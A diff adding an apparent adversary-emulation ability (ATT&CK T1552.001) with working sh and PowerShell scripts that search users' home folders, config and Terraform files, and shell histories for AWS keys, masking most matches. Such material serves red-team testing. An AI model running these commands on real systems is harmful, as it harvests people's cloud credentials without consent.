@@ -1,0 +1,79 @@
+---
+- id: aws-cred-001
+  name: Extract AWS Credentials from Files
+  description: Search for AWS credentials in common file locations
+  tactic: credential-access
+  technique:
+    attack_id: T1552.001
+    name: Credentials In Files
+  platforms:
+    darwin:
+      sh:
+        command: |
+          echo "[+] Searching for AWS credentials in files:"
+          # Search common locations for AWS credentials
+          find /Users/$USER -name "*.env" -o -name "*.config" -o -name "*.json" -o -name "*.yaml" -o -name "*.yml" 2>/dev/null | head -20 | while read file; do
+            if grep -l -i "aws.*key\|access.*key\|secret.*key" "$file" 2>/dev/null; then
+              echo "[+] Potential AWS credentials in: $file"
+              grep -i "aws.*key\|access.*key\|secret.*key" "$file" 2>/dev/null | head -3 | sed 's/[A-Za-z0-9+/=]\{20,\}/[REDACTED]/g'
+            fi
+          done
+          # Check for terraform files
+          find /Users/$USER -name "*.tf" -o -name "terraform.tfvars" 2>/dev/null | head -10 | while read file; do
+            if grep -l -i "access_key\|secret_key\|aws_" "$file" 2>/dev/null; then
+              echo "[+] Terraform file with AWS config: $file"
+            fi
+          done
+          # Check bash history for AWS commands
+          if [ -f ~/.bash_history ]; then
+            echo "[+] AWS commands in bash history:"
+            grep -i "aws.*configure\|export.*aws" ~/.bash_history 2>/dev/null | tail -5 | sed 's/[A-Za-z0-9+/=]\{20,\}/[REDACTED]/g'
+          fi
+    linux:
+      sh:
+        command: |
+          echo "[+] Searching for AWS credentials in files:"
+          # Search common locations for AWS credentials  
+          find /home/$USER -name "*.env" -o -name "*.config" -o -name "*.json" -o -name "*.yaml" -o -name "*.yml" 2>/dev/null | head -20 | while read file; do
+            if grep -l -i "aws.*key\|access.*key\|secret.*key" "$file" 2>/dev/null; then
+              echo "[+] Potential AWS credentials in: $file"
+              grep -i "aws.*key\|access.*key\|secret.*key" "$file" 2>/dev/null | head -3 | sed 's/[A-Za-z0-9+/=]\{20,\}/[REDACTED]/g'
+            fi
+          done
+          # Check for terraform files
+          find /home/$USER -name "*.tf" -o -name "terraform.tfvars" 2>/dev/null | head -10 | while read file; do
+            if grep -l -i "access_key\|secret_key\|aws_" "$file" 2>/dev/null; then
+              echo "[+] Terraform file with AWS config: $file"
+            fi
+          done
+          # Check bash history for AWS commands
+          if [ -f ~/.bash_history ]; then
+            echo "[+] AWS commands in bash history:"
+            grep -i "aws.*configure\|export.*aws" ~/.bash_history 2>/dev/null | tail -5 | sed 's/[A-Za-z0-9+/=]\{20,\}/[REDACTED]/g'
+          fi
+    windows:
+      psh,pwsh:
+        command: |
+          Write-Host "[+] Searching for AWS credentials in files:"
+          # Search common file locations
+          $searchPaths = @("$env:USERPROFILE", "$env:USERPROFILE\Documents", "$env:USERPROFILE\Desktop")
+          $fileTypes = @("*.env", "*.config", "*.json", "*.yaml", "*.yml", "*.tf")
+          
+          foreach ($path in $searchPaths) {
+            foreach ($type in $fileTypes) {
+              Get-ChildItem -Path $path -Filter $type -Recurse -ErrorAction SilentlyContinue | Select-Object -First 10 | ForEach-Object {
+                $content = Get-Content $_.FullName -ErrorAction SilentlyContinue | Select-String -Pattern "aws.*key|access.*key|secret.*key" -CaseSensitive:$false
+                if ($content) {
+                  Write-Host "[+] Potential AWS credentials in: $($_.FullName)"
+                  $content | Select-Object -First 3 | ForEach-Object { $_ -replace '[A-Za-z0-9+/=]{20,}', '[REDACTED]' }
+                }
+              }
+            }
+          }
+          
+          # Check PowerShell history
+          $historyPath = "$env:USERPROFILE\AppData\Roaming\Microsoft\Windows\PowerShell\PSReadLine\ConsoleHost_history.txt"
+          if (Test-Path $historyPath) {
+            Write-Host "[+] AWS commands in PowerShell history:"
+            Get-Content $historyPath -ErrorAction SilentlyContinue | Select-String -Pattern "aws.*configure|Set.*AWS" -CaseSensitive:$false | Select-Object -Last 5
+          }
